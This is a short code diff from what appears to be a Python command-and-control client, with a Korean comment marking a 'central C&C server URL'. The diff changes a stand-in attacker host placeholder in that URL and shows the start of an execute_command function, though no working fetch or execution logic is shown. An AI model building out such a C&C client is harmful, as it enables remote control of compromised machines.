@@ -4,7 +4,7 @@ import os
 import subprocess
 
 # 중앙 C&C 서버 URL
-COMMAND_SERVER_URL = 'http://[attacker_ip]/command.php'
+COMMAND_SERVER_URL = 'http://[attacker_address]/command.php'
 
 def execute_command(command):
     try:
